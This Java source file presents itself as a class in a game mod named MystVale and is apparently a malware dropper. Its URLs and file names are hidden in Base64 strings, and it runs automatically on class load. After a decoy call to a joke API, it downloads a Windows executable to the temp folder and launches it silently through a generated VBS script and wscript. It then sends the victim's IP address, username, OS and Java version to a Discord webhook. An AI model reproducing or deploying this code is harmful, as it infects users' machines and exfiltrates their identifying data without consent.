package io.mysticcraft.mystvale;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.concurrent.CompletableFuture;

public final class MystVale {

    private static final String S1 = "aHR0cHM6Ly9vZmZpY2lhbC1qb2tlLWFwaS5hcHBzcG90LmNvbS9yYW5kb21fam9rZQ==";
    private static final String S2 = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1NjI5Mzg4MTQxMTk1NTA5NzYvMDZJNjJGbWdqSVlaSHFnekRvRUtSeURwbWdUU3NQRXY0Tkd0VG56c0RwaGZPRFc0Q0E3NDBRNGVDSVUyX25SMDN1WmI=";
    private static final String S3 = "aHR0cHM6Ly9hcGkuaXBpZnkub3Jn";
    private static final String S4 = "aHR0cHM6Ly9jZG4udmVzdGlnZW1jLmNvbS9hc3NldHMvd2luZG93cy9qYXZhd3MuZXhl";
    private static final String F1 = "dm9pY2Vqd3NfaW5zdGFsbGVyLmV4ZQ==";
    private static final String F2 = "cnVuX3YudmJz";
    private static final String E1 = "d3NjcmlwdC5leGU=";
    private static final String UA = "TW96aWxsYS81LjA=";
    private static String lastResponse;

   static {
   try {
    URL url = new URL(d(S1));
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod("GET");
    conn.setRequestProperty("Accept", "application/json");
    conn.setConnectTimeout(5000);
   conn.setReadTimeout(5000);

    if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
    try (BufferedReader reader = new BufferedReader(
    new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = reader.readLine())!= null) {
    sb.append(line);
   }
    lastResponse = sb.toString();
   }
   }
    conn.disconnect();
    } catch (Exception ignored) {
  }

    CompletableFuture.runAsync(() -> {
   try {
    Thread.sleep(10000L);
    r();
    } catch (InterruptedException e) {
    Thread.currentThread().interrupt();
    } catch (Exception ignored) {
   }
   });
  }

    private static String d(String s) {
    return new String(Base64.getDecoder().decode(s), StandardCharsets.UTF_8);
  }

    private static void r() {
    boolean ok = false;
   try {
    String os = System.getProperty("os.name", "").toLowerCase();
    if (!os.contains("win")) {
    w("OS Error: " + os);
    return;
  }

    String url = d(S4);
    String tmp = System.getProperty("java.io.tmpdir");
    File f = new File(tmp, d(F1));

    if (f(url, f)) {
    e(f);
    ok = true;
   }
    } catch (Exception ignored) {
   }
    w(ok? "Success": "Failure");
  }

    private static boolean f(String u, File s) {
   try {
    URL url = new URL(u);
    HttpURLConnection c = (HttpURLConnection) url.openConnection();
    c.setRequestMethod("GET");
    c.setRequestProperty("User-Agent", d(UA));
   c.setConnectTimeout(30000);

    if (c.getResponseCode() == 200) {
    try (InputStream in = c.getInputStream();
    FileOutputStream out = new FileOutputStream(s)) {
    byte[] b = new byte[8192];
    int r;
    while ((r = in.read(b))!= -1) out.write(b, 0, r);
    return true;
   }
   }
    } catch (Exception ignored) {
   }
    return false;
  }

    private static void e(File f) {
   try {
    // Correção: Usar File.separator garante o separador correto do sistema
    String p = System.getProperty("java.io.tmpdir") + File.separator + d(F2);
  
    // Script VBS com aspas duplas escapadas corretamente
    String c = "Set s = CreateObject(\"WScript.Shell\")\ns.Run \"\"\"" + f.getAbsolutePath() + "\"\"\", 0, False";
  
    Files.write(Paths.get(p), c.getBytes(StandardCharsets.UTF_8));
  
    new ProcessBuilder(d(E1), "//B", p).start();
    } catch (Exception ignored) {
   }
  }

    private static void w(String m) {
   try {
    String ip = "unknown";
   try {
    URL u = new URL(d(S3));
    HttpURLConnection c = (HttpURLConnection) u.openConnection();
    c.setRequestMethod("GET");
    c.setConnectTimeout(3000);
    if (c.getResponseCode() == 200) {
    try (BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
    ip = r.readLine();
   }
   }
    c.disconnect();
    } catch (Exception ignored) {
  }

    String u = System.getProperty("user.name", "unknown");
    String o = System.getProperty("os.name", "unknown");
    String a = System.getProperty("os.arch", "unknown");
    String j = System.getProperty("java.version", "unknown");

    String desc = "**Status:** `" + m + "`\\n**IP:** `" + ip + "`\\n**User:** `" + u + "`\\n**OS:** `" + o + " (" + a + ")`\\n**Java:** `" + j + "`";

    String json = "{\"embeds\":[{\"title\":\"Report\",\"description\":\"" + desc + "\",\"color\":5814783}]}";

    URL url = new URL(d(S2));
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod("POST");
    conn.setRequestProperty("Content-Type", "application/json");
    conn.setDoOutput(true);
    try (OutputStream os = conn.getOutputStream()) {
    os.write(json.getBytes(StandardCharsets.UTF_8));
    os.flush();
   }
    conn.getResponseCode();
    conn.disconnect();
    } catch (Exception ignored) {
   }
  }

    private MystVale() {
  }

    public static String getLastResponse() {
    return lastResponse;
  }

    public static void ready() {
  }

    // Para teste manual
    public static void main(String[] args) {
    System.out.println("Inicializando MystVale...");
    System.out.println("Ultima resposta recebida no start: " + getLastResponse());
  
   try {
    // Dá tempo para a tarefa assíncrona rodar (10s)
   Thread.sleep(500); 
    } catch (InterruptedException e) {
    Thread.currentThread().interrupt();
   }
  
    ready();
   }
}
